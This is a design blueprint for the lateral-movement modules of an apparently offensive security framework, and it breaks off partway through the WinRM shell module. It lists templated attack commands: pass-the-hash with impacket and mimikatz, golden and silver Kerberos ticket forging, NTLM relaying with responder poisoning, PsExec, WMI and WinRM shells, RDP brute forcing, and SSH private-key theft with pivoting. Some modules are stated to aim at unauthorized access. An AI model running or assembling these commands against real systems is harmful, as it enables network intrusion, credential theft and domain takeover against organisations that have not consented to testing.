# Lateral Movement — Category Blueprint

**Category:** `LATERAL_MOVEMENT` | **Slug:** `lateral` | **Tools Dir:** `~/jabber/jabber-tools/lateral/`
**Package:** `com.jabber.jabber.modules.lateral` | **Group:** Privilege & Identity

---

## ToolManager: `lateral/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `impacket` | `impacket-*` | pip (impacket) | `impacket-smbclient --help` | `pip_install` |
| `crackmapexec` | `crackmapexec` | pip/apt | `crackmapexec --version` | `pip_install` |
| `evil-winrm` | `evil-winrm` | gem/pip | `evil-winrm --help` | `pip_install` |
| `smbclient` | `smbclient` | apt (smbclient) | `smbclient --version` | `apt_install` |
| `rpcclient` | `rpcclient` | apt (smbclient) | `rpcclient --version` | `apt_install` |
| `xfreerdp` | `xfreerdp` | apt (freerdp2-x11) | `xfreerdp --version` | `apt_install` |
| `hydra` | `hydra` | apt | `hydra -V` | `apt_install` |
| `nmap` | `nmap` | apt | `nmap --version` | `apt_install` |
| `mimikatz` | `mimikatz.exe` | `gentilkiwi/mimikatz` | N/A (Windows) | `github_release` |
| `rubeus` | `Rubeus.exe` | `GhostPack/Rubeus` | N/A (Windows) | `github_release` |
| `netcat` | `nc` | apt | `nc -h` | `apt_install` |

---

## Modules

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Lateral Movement** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between exploitation and auditing/verification.
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading forged tickets, extracted credentials, and session logs.
4. **Lateral Movement Graph**: Visual map of the domain architecture showing compromised hosts, pivot points, and target systems.
5. **Interactive Shell Terminal**: For modules that gain shell access (e.g., PsExec, WinRM), a live terminal interface for real-time interaction.

---

---

## Modules
### 1. Pass The Hash
**ID:** `lateral-pth` | **Risk:** CRITICAL | **File:** `PassTheHashModule.java`
**Tools:** `impacket`, `crackmapexec`, `smbclient`, `nmap`, `mimikatz`

#### Execution Modes:

- **`EXEC`** (Short Name: `EXEC`)
    - **Purpose**: Execute remote commands using NTLM hashes without cleartext passwords.
    - **Input Schema**: `{ target: String, user: String, hash: String, command: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-wmiexec -hashes <hash> <user>@<target> "<command>"` (Core Execution)
        2. `crackmapexec smb <target> -u <user> -H <hash> -x "<command>"` (Alternative Execution)
        3. `smbclient -I <target> -U <user>%<hash> -c "<command>"` (Direct SMB Client)
        4. `nmap -p 445 --script smb-os-discovery <target>` (Target Fingerprinting)
        5. `mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<user> /domain:<target> /ntlm:<hash>"` (Local Token Injection)
    - **Execution Flow**: Core Execution -> Alternative -> Direct Client -> Fingerprinting -> Token Injection.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXEC_[Timestamp]_wmiexec_results.txt`: Captured output from remote command execution via WMI.
        - `reports/artifacts/EXEC_[Timestamp]_smb_os_discovery.xml`: Nmap OS discovery and fingerprinting results.
        - `reports/analysis/EXEC_[Timestamp]_token_injection.json`: Status and telemetry from local token injection.

- **`SHEL`** (Short Name: `SHEL`)
    - **Purpose**: Gain semi-interactive shell access via Pass-the-Hash.
    - **Input Schema**: `{ target: String, user: String, hash: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-psexec -hashes <hash> <user>@<target>` (Core Shell)
        2. `crackmapexec smb <target> -u <user> -H <hash> --shell` (Alternative Shell)
        3. `smbclient // <target>/C$ -U <user>%<hash>` (FileSystem Access)
        4. `nmap -p 445 <target>` (Service Liveness)
        5. `mimikatz.exe "sekurlsa::pth /user:<user> /ntlm:<hash>"` (Identity Prep)
    - **Execution Flow**: Core Shell -> Alternative -> FS Access -> Liveness -> Identity Prep.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SHELL_[Timestamp]_psexec_session.log`: Log of the semi-interactive psexec shell session.
        - `reports/outputs/SHELL_[Timestamp]_smb_shares.json`: List of identified administrative and user shares.
        - `reports/analysis/SHELL_[Timestamp]_identity_prep.txt`: Log of Mimikatz identity preparation and injection.

---

### 2. Pass The Ticket
**ID:** `lateral-ptt` | **Risk:** CRITICAL | **File:** `PassTheTicketModule.java`
**Tools:** `impacket`, `rubeus`, `nmap`, `mimikatz`, `klist`

#### Execution Modes:

- **`INJT`** (Short Name: `INJT`)
    - **Purpose**: Inject Kerberos tickets into the current session context.
    - **Input Schema**: `{ ticket_path: Path, target: String }`
    - **Multi-Tool Command Logic**:
        1. `export KRB5CCNAME=<ticket_path> && klist` (Ticket Activation)
        2. `impacket-smbexec -k -no-pass <target>` (Kerberos Authentication)
        3. `rubeus.exe ptt /ticket:<ticket_path>` (Rubeus Injection)
        4. `mimikatz.exe "kerberos::ptt <ticket_path>"` (Mimikatz Injection)
        5. `nmap -p 88,445 <target>` (Protocol Audit)
    - **Execution Flow**: Activation -> Kerberos Auth -> Rubeus -> Mimikatz -> Protocol Audit.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/INJECT_[Timestamp]_krb5ccname.ccache`: Activated Kerberos credential cache file.
        - `reports/outputs/INJECT_[Timestamp]_rubeus_ptt.log`: Detailed log of Rubeus ticket injection.
        - `reports/analysis/INJECT_[Timestamp]_protocol_audit.json`: Nmap audit of Kerberos and SMB protocols.

- **`FORG`** (Short Name: `FORG`)
    - **Purpose**: Forge Kerberos service tickets (Silver Tickets) for lateral movement.
    - **Input Schema**: `{ spn: String, user: String, hash: String, domain: String, sid: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <spn> <user>` (Core Forging)
        2. `rubeus.exe silver /service:<spn> /user:<user> /ntlm:<hash> /sid:<sid> /domain:<domain>` (Rubeus Forge)
        3. `mimikatz.exe "kerberos::golden /domain:<domain> /sid:<sid> /rc4:<hash> /user:<user> /service:<spn>"` (Mimikatz Forge)
        4. `nmap -p 88 <domain_controller>` (KDC Discovery)
        5. `klist purge` (Environment Cleanup)
    - **Execution Flow**: Core Forging -> Rubeus Forge -> Mimikatz Forge -> KDC Discovery -> Cleanup.
    - **Output Generation & Artifacts**:
        - `reports/payloads/FORGE_[Timestamp]_silver_ticket.kirbi`: Successfully forged Silver Ticket file.
        - `reports/outputs/FORGE_[Timestamp]_ticket_forging.log`: Detailed orchestration log of the ticket forging process.
        - `reports/analysis/FORGE_[Timestamp]_kdc_discovery.json`: Fingerprint of the identified Domain Controller.

---

### 3. Golden Ticket Forge
**ID:** `lateral-golden-ticket` | **Risk:** CRITICAL | **File:** `GoldenTicketModule.java`
**Tools:** `impacket`, `crackmapexec`, `nmap`, `mimikatz`, `rubeus`

#### Execution Modes:

- **`FORG`** (Short Name: `FORG`)
    - **Purpose**: Forge Kerberos TGTs (Golden Tickets) for persistent domain dominance.
    - **Input Schema**: `{ domain: String, sid: String, krbtgt_hash: String, user: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> <user>` (Core Forge)
        2. `rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domain> /sid:<sid> /user:<user>` (Rubeus Forge)
        3. `mimikatz.exe "kerberos::golden /domain:<domain> /sid:<sid> /rc4:<krbtgt_hash> /user:<user> /ptt"` (Mimikatz Forge)
        4. `crackmapexec smb <domain> -u <user> -k` (Ticket Validation)
        5. `nmap -p 88 <domain>` (Domain Controller Probe)
    - **Execution Flow**: Core Forge -> Rubeus Forge -> Mimikatz Forge -> Validation -> DC Probe.
    - **Output Generation & Artifacts**:
        - `reports/payloads/FORGE_[Timestamp]_golden_ticket.kirbi`: Successfully forged Golden Ticket file.
        - `reports/outputs/FORGE_[Timestamp]_ticket_validation.txt`: Log of successful ticket validation via SMB.
        - `reports/analysis/FORGE_[Timestamp]_dc_probe.json`: Technical profile of the probed Domain Controller.

- **`PURG`** (Short Name: `PURG`)
    - **Purpose**: Clean up Kerberos environment and forged tickets.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `klist purge` (System Purge)
        2. `rubeus.exe purge` (Rubeus Purge)
        3. `mimikatz.exe "kerberos::purge"` (Mimikatz Purge)
        4. `crackmapexec smb 127.0.0.1` (Self Audit)
        5. `nmap --help` (Version Check)
    - **Execution Flow**: System Purge -> Rubeus Purge -> Mimikatz Purge -> Self Audit -> Version Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/PURGE_[Timestamp]_cleanup_report.json`: Summary of all Kerberos tickets and sessions purged.
        - `reports/artifacts/PURGE_[Timestamp]_system_audit.txt`: Audit of the system's Kerberos state after cleanup.
        - `reports/analysis/PURGE_[Timestamp]_binary_audit.json`: Status and version audit of lateral movement tools.

---

---

### 4. DCOM Relay
**ID:** `lateral-dcom-relay` | **Risk:** CRITICAL | **File:** `DCOMRelayModule.java`
**Tools:** `impacket`, `responder`, `nmap`, `rpcclient`

#### Execution Modes:

- **`RELY`** (Short Name: `RELY`)
    - **Purpose**: Relay NTLM authentication to DCOM objects for remote code execution.
    - **Input Schema**: `{ target: String, cls_id: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-dcomexec -t <target> -clsid <cls_id>` (Core Relay)
        2. `responder -I eth0 -rdw` (Poisoning)
        3. `nmap -p 135 <target>` (RPC Discovery)
        4. `rpcclient -U "" -N <target>` (Null Session Check)
    - **Execution Flow**: Poisoning -> RPC Discovery -> Null Check -> Core Relay.
    - **Output Generation & Artifacts**:
        - `reports/outputs/RELAY_[Timestamp]_dcom_relay_results.txt`: Captured output from relayed DCOM execution.
        - `reports/artifacts/RELAY_[Timestamp]_responder_poison.log`: Log of network poisoning and capture attempts.
        - `reports/analysis/RELAY_[Timestamp]_rpc_discovery.json`: Detailed report on remote RPC services.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify the DCOM configuration and target susceptibility.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 135 --script dcom-enum <target>` (DCOM Enumeration)
        2. `rpcclient -U "" -N <target>` (Null Session Check)
        3. `crackmapexec smb <target> --gen-relay-list relay.txt` (Target Discovery)
        4. `impacket-rpcdump <target>` (RPC Dump)
        5. `responder --help` (Binary Check)
    - **Execution Flow**: DCOM Enumeration -> Null Check -> Target Discovery -> RPC Dump -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_dcom_vulnerability.json`: Status of DCOM relay vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_dcom_context.json`: DCOM settings and environment context.

---

### 5. NTLM Relayer
**ID:** `lateral-ntlm-relayer` | **Risk:** CRITICAL | **File:** `NTLMRelayerModule.java`
**Tools:** `impacket`, `crackmapexec`, `responder`, `nmap`

#### Execution Modes:

- **`ATCK`** (Short Name: `ATCK`)
    - **Purpose**: Multi-protocol NTLM relaying and attack orchestration.
    - **Input Schema**: `{ targets_file: Path, command: String }`
    - **Multi-Tool Command Logic**:
        1. `ntlmrelayx.py -tf <targets_file> -c "<command>"` (Core Relayer)
        2. `crackmapexec smb <targets_file> --gen-relay-list relay.txt` (Target Discovery)
        3. `responder -I eth0` (Interception)
        4. `nmap -sn -iL <targets_file>` (Liveness)
    - **Execution Flow**: Discovery -> Liveness -> Interception -> Core Relayer.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ATTACK_[Timestamp]_relay_success.json`: List of targets successfully relayed and command results.
        - `reports/artifacts/ATTACK_[Timestamp]_captured_hashes.txt`: Hashes captured during the relay session.
        - `reports/analysis/ATTACK_[Timestamp]_relay_targets.txt`: Final list of signing-disabled relay targets.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify NTLM relaying susceptibility and target configuration.
    - **Input Schema**: `{ targets_file: Path }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 --script smb-security-mode -iL <targets_file>` (SMB Signing Audit)
        2. `crackmapexec smb <targets_file> --gen-relay-list relay.txt` (Target Discovery)
        3. `impacket-rpcdump -iL <targets_file>` (RPC Dump)
        4. `responder --help` (Binary Check)
        5. `ntlmrelayx.py --help` (Binary Check)
    - **Execution Flow**: SMB Signing -> Target Discovery -> RPC Dump -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_ntlm_vulnerability.json`: Status of NTLM relay vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_ntlm_context.json`: SMB signing settings and environment context.

---

### 6. PsExec Native
**ID:** `lateral-psexec-native` | **Risk:** HIGH | **File:** `PsExecNativeModule.java`
**Tools:** `impacket`, `crackmapexec`, `smbclient`, `nmap`, `netcat`

#### Execution Modes:

- **`SHEL`** (Short Name: `SHEL`)
    - **Purpose**: Gain administrative shell access via service creation (PsExec).
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `impacket-psexec <domain>/<user>:<pass>@<target>` (Core Shell)
        2. `crackmapexec smb <target> -u <user> -p <pass> --psexec` (Alternative Shell)
        3. `smbclient // <target>/ADMIN$ -U <user>%<pass>` (Share Audit)
        4. `nmap -p 445 <target>` (Service Discovery)
        5. `nc -nv <target> 445` (TCP Connectivity)
    - **Execution Flow**: Core Shell -> Alternative -> Share Audit -> Service Discovery -> Connectivity.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SHELL_[Timestamp]_psexec_core.log`: Core execution log for the psexec shell.
        - `reports/outputs/SHELL_[Timestamp]_share_audit.json`: Audit of accessible shares required for psexec.
        - `reports/analysis/SHELL_[Timestamp]_service_discovery.json`: Detailed fingerprint of the remote SMB service.

- **`EXEC`** (Short Name: `EXEC`)
    - **Purpose**: Execute high-privilege remote commands via service orchestration.
    - **Input Schema**: `{ target: String, user: String, pass: Password, command: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-psexec <domain>/<user>:<pass>@<target> "<command>"` (Core Execution)
        2. `crackmapexec smb <target> -u <user> -p <pass> -x "<command>"` (Alternative Execution)
        3. `smbclient -c "<command>" // <target>/C$ -U <user>%<pass>` (Direct Execution)
        4. `nmap --script smb-enum-shares <target>` (Share Discovery)
        5. `impacket-smbclient <domain>/<user>:<pass>@<target>` (Authenticated Context)
    - **Execution Flow**: Core Execution -> Alternative -> Direct Execution -> Share Discovery -> Authenticated Context.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXEC_[Timestamp]_psexec_output.txt`: Results from high-privilege remote command execution.
        - `reports/artifacts/EXEC_[Timestamp]_smb_enum_shares.xml`: Nmap enumeration of all remote shares.
        - `reports/analysis/EXEC_[Timestamp]_authenticated_context.json`: Audit of the authenticated SMB session context.

---

### 7. RDP Brute Force
**ID:** `lateral-rdp-brute` | **Risk:** MEDIUM | **File:** `RDPBruteModule.java`
**Tools:** `hydra`, `xfreerdp`, `nmap`, `crackmapexec`, `ncrack`

#### Execution Modes:

- **`BRTE`** (Short Name: `BRTE`)
    - **Purpose**: Brute-force RDP credentials to gain unauthorized remote desktop access.
    - **Input Schema**: `{ target: String, user: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `hydra -l <user> -P <wordlist> rdp://<target>` (Core Brute)
        2. `ncrack -p rdp --user <user> -P <wordlist> <target>` (Alternative Brute)
        3. `nmap -p 3389 --script rdp-enum-encryption <target>` (Service Audit)
        4. `crackmapexec rdp <target> -u <user> -p <wordlist>` (CME Validation)
        5. `xfreerdp /v:<target> /u:<user> /p:test` (Manual Verification)
    - **Execution Flow**: Core Brute -> Alternative -> Service Audit -> Validation -> Verification.
    - **Output Generation & Artifacts**:
        - `reports/outputs/BRUTE_[Timestamp]_hydra_rdp.txt`: Successfully identified RDP credentials.
        - `reports/artifacts/BRUTE_[Timestamp]_rdp_audit.xml`: Nmap audit of RDP encryption and security.
        - `reports/analysis/BRUTE_[Timestamp]_ncrack_rdp.log`: Results from the alternative ncrack brute force.

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Identify network assets with RDP enabled and audit their security posture.
    - **Input Schema**: `{ targets: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 3389 --script rdp-vuln-ms12-020 <targets>` (Vulnerability Scan)
        2. `crackmapexec rdp <targets>` (Discovery Scan)
        3. `hydra -h` (Binary Check)
        4. `ncrack -V` (Binary Check)
        5. `xfreerdp --version` (Binary Check)
    - **Execution Flow**: Vulnerability Scan -> Discovery Scan -> Binary Check x3.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SCAN_[Timestamp]_rdp_vulnerabilities.json`: Analysis of identified RDP vulnerabilities (e.g., BlueKeep).
        - `reports/artifacts/SCAN_[Timestamp]_discovery_scan.txt`: Results of the CME discovery scan for RDP.
        - `reports/analysis/SCAN_[Timestamp]_tool_readiness.json`: Verification of all RDP-related binaries.

---

### 8. SSH Key Steal
**ID:** `lateral-ssh-steal` | **Risk:** HIGH | **File:** `SSHKeyStealModule.java`
**Tools:** `ssh`, `scp`, `find`, `nmap`, `ssh-keygen`

#### Execution Modes:

- **`SCAN`** (Short Name: `SCAN`)
    - **Purpose**: Search for and extract private SSH keys from a remote host for further lateral movement.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `ssh <user>@<target> "find /home -name 'id_rsa' 2>/dev/null"` (Core Key Discovery)
        2. `scp <user>@<target>:/home/<user>/.ssh/id_rsa .` (Key Extraction)
        3. `nmap -p 22 <target>` (SSH Port Probe)
        4. `ssh-keygen -l -f id_rsa` (Key Validation)
        5. `find /root/.ssh/ -name "*" 2>/dev/null` (Root Discovery)
    - **Execution Flow**: Discovery -> Extraction -> Port Probe -> Validation -> Root Discovery.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SCAN_[Timestamp]_id_rsa`: Extracted private SSH key file.
        - `reports/outputs/SCAN_[Timestamp]_key_validation.txt`: Log of the extracted key's fingerprint and validity.
        - `reports/analysis/SCAN_[Timestamp]_ssh_port_probe.json`: Audit of the remote SSH service and port.

- **`PIVT`** (Short Name: `PIVT`)
    - **Purpose**: Use stolen SSH keys to pivot to a second-tier target.
    - **Input Schema**: `{ pivot_target: String, user: String, key_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `ssh -i <key_path> <user>@<pivot_target> "whoami"` (Core Pivot)
        2. `scp -i <key_path> <key_path> <user>@<pivot_target>:/tmp/` (Key Propagation)
        3. `nmap -p 22 <pivot_target>` (Pivot Liveness)
        4. `ssh-keygen -y -f <key_path>` (Public Key Recovery)
        5. `ssh -V` (Version Check)
    - **Execution Flow**: Core Pivot -> Propagation -> Liveness -> Recovery -> Version Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/PIVOT_[Timestamp]_pivot_identity.txt`: Confirmation of successful identity gain on the pivot target.
        - `reports/artifacts/PIVOT_[Timestamp]_key_propagation.log`: Log of SSH key propagation to the second-tier target.
        - `reports/analysis/PIVOT_[Timestamp]_pivot_liveness.json`: Report on the second-tier target's liveness and SSH status.

---

### 9. Ticket Forger
**ID:** `lateral-ticket-forger` | **Risk:** CRITICAL | **File:** `TicketForgerModule.java`
**Tools:** `impacket`, `mimikatz`, `rubeus`, `klist`

#### Execution Modes:

- **`FORG`** (Short Name: `FORG`)
    - **Purpose**: Advanced Kerberos ticket forging (Golden/Silver/Diamond).
    - **Input Schema**: `{ type: String, domain: String, sid: String, hash: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> <user>` (Impacket Forge)
        2. `rubeus.exe <type> /rc4:<hash> /domain:<domain> /sid:<sid>` (Rubeus Forge)
        3. `mimikatz.exe "kerberos::golden ..."` (Mimikatz Forge)
        4. `klist purge` (Environment Prep)
    - **Execution Flow**: Prep -> Impacket Forge -> Rubeus Forge -> Mimikatz Forge.
    - **Output Generation & Artifacts**:
        - `reports/payloads/FORGE_[Timestamp]_forged_ticket.kirbi`: Successfully forged Kerberos ticket.
        - `reports/artifacts/FORGE_[Timestamp]_forging_telemetry.log`: Step-by-step log of the forging process.
        - `reports/analysis/FORGE_[Timestamp]_ticket_info.txt`: Technical breakdown of the forged ticket attributes.

- **`VRFY`** (Short Name: `VRFY`)
    - **Purpose**: Offline validation and inspection of existing forged tickets.
    - **Input Schema**: `{ ticket_file: Path }`
    - **Multi-Tool Command Logic**:
        1. `rubeus.exe describe /ticket:<ticket_file>` (Integrity Check)
        2. `impacket-ticketConverter <ticket_file> output.ccache` (Format Validate)
        3. `klist -c output.ccache` (Metadata Extract)
        4. `mimikatz.exe "kerberos::list"` (System Context)
        5. `klist` (System Context)
    - **Execution Flow**: Integrity Check -> Format Validate -> Metadata Extract -> System Context x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/VERIFY_[Timestamp]_ticket_status.json`: Technical validation report of the ticket file.
        - `reports/analysis/VERIFY_[Timestamp]_ticket_metadata.json`: Extracted metadata from the ticket.

---

### 10. WMIExec Native
**ID:** `lateral-wmiexec-native` | **Risk:** HIGH | **File:** `WMIExecNativeModule.java`
**Tools:** `impacket`, `crackmapexec`, `nmap`, `rpcclient`, `smbclient`

#### Execution Modes:

- **`EXEC`** (Short Name: `EXEC`)
    - **Purpose**: Execute remote commands via Windows Management Instrumentation (WMI).
    - **Input Schema**: `{ target: String, user: String, pass: Password, command: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-wmiexec <domain>/<user>:<pass>@<target> "<command>"` (Core Execution)
        2. `crackmapexec smb <target> -u <user> -p <pass> -x "<command>"` (Alternative Execution)
        3. `nmap -p 135,445 <target>` (WMI/SMB Port Probe)
        4. `rpcclient -U <user>%<pass> <target> -c "querydominfo"` (RPC Domain Audit)
        5. `smbclient -L <target> -U <user>%<pass>` (Share Access Verification)
    - **Execution Flow**: Core Execution -> Alternative -> Port Probe -> Domain Audit -> Access Verify.
    - **Output Generation & Artifacts**:
        - `reports/outputs/EXEC_[Timestamp]_wmiexec_results.txt`: Results from remote command execution via WMI.
        - `reports/artifacts/EXEC_[Timestamp]_rpc_domain_audit.txt`: Domain information retrieved via RPC.
        - `reports/analysis/EXEC_[Timestamp]_wmi_port_probe.json`: Audit of WMI and SMB ports on the target.

- **`SHEL`** (Short Name: `SHEL`)
    - **Purpose**: Gain semi-interactive shell access via WMI object orchestration.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `impacket-wmiexec <domain>/<user>:<pass>@<target>` (Core Shell)
        2. `crackmapexec smb <target> -u <user> -p <pass> --wmiexec` (Alternative Shell)
        3. `nmap -p 135 <target>` (DCOM Discovery)
        4. `rpcclient -U <user>%<pass> <target>` (RPC Context)
        5. `smbclient // <target>/C$ -U <user>%<pass>` (Admin Access Check)
    - **Execution Flow**: Core Shell -> Alternative -> DCOM Discovery -> RPC Context -> Admin Check.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SHELL_[Timestamp]_wmiexec_shell.log`: Log of the semi-interactive WMI shell session.
        - `reports/outputs/SHELL_[Timestamp]_admin_access_check.json`: Verification of administrative access levels.
        - `reports/analysis/SHELL_[Timestamp]_rpc_context.txt`: Telemetry from the RPC authenticated context.

---

### 11. WinRM Inject
**ID:** `lateral-winrm-inject` | **Risk:** HIGH | **File:** `WinRMInjectModule.java`
**Tools:** `evil-winrm`, `powershell`, `nmap`

#### Execution Modes:

- **`INJT`** (Short Name: `INJT`)
    - **Purpose**: Inject payloads and execute commands via authenticated WinRM sessions.
    - **Input Schema**: `{ target: String, user: String, pass: Password, payload: Path }`
    - **Multi-Tool Command Logic**:
        1. `evil-winrm -i <target> -u <user> -p <pass> -s <payload_dir>` (Core Injection)
        2. `powershell -Command "Invoke-Command -ComputerName <target> -ScriptBlock { ... }"` (Native Pivot)
        3. `nmap -p 5985 <target>` (Service Check)
    - **Execution Flow**: Service Check -> Core Injection -> Native Pivot.
    - **Output Generation & Artifacts**:
        - `reports/outputs/INJECT_[Timestamp]_injection_results.txt`: Captured output from injected payload execution.
        - `reports/artifacts/INJECT_[Timestamp]_session_transcript.log`: Transcript of the WinRM injection session.
        - `reports/analysis/INJECT_[Timestamp]_winrm_status.json`: Status of WinRM service and listener configuration.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify WinRM susceptibility and target configuration.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 5985,5986 <target>` (WinRM Port Probe)
        2. `crackmapexec winrm <target>` (Target Discovery)
        3. `powershell -Command "Test-WSMan -ComputerName <target>"` (WSMan Check)
        4. `evil-winrm --help` (Binary Check)
        5. `nmap -sV -p 5985 <target>` (Service Fingerprint)
    - **Execution Flow**: WinRM Port -> Target Discovery -> WSMan Check -> Binary Check -> Service Fingerprint.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_winrm_vulnerability.json`: Status of WinRM vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_winrm_context.json`: WinRM settings and environment context.

---

### 12. WinRM Shell
**ID:** `lateral-winrm` | **Risk:** HIGH | **File:** `WinRMModule.java`
**Tools:** `evil-winrm`, `crackmapexec`, `nmap`, `rpcclient`, `smbclient`

#### Execution Modes:

- **`SHEL`** (Short Name: `SHEL`)
    - **Purpose**: Gain administrative shell access via Windows Remote Management (WinRM).
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `evil-winrm -i <target> -u <user> -p <pass>` (Core Shell)
        2. `crackmapexec winrm <target> -u <user> -p <pass> -x "whoami"` (WinRM Execution)
        3. `nmap -p 5985,5986 <target>` (WinRM Port Probe)
        4. `rpcclient -U <user>%<pass> <target>` (RPC Audit)
        5. `smbclient -L <target> -U <user>%<pass>` (SMB Conflict Check)
    - **Execution Flow**: Core Shell -> WinRM Execution -> Port Probe -> RPC Audit -> Conflict Check.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/SHELL_[Timestamp]_evil_winrm.log`: Comprehensive session log from Evil-WinRM.
        - `reports/outputs/SHELL_[Timestamp]_winrm_exec_verify.txt`: Results from the WinRM identity verification command.
        - `reports/analysis/SHELL_[Timestamp]_port_probe.json`: Audit of WinRM ports (5985, 5986).

- **`EXEC`** (Short Name: `EXEC`)
    - **Purpose**: Execute high-speed remote commands via WinRM service.
    - **Input Schema**: `{ target: String, user: String, pass: Password, command: String }`
    - **Multi-Tool Command Logic**:
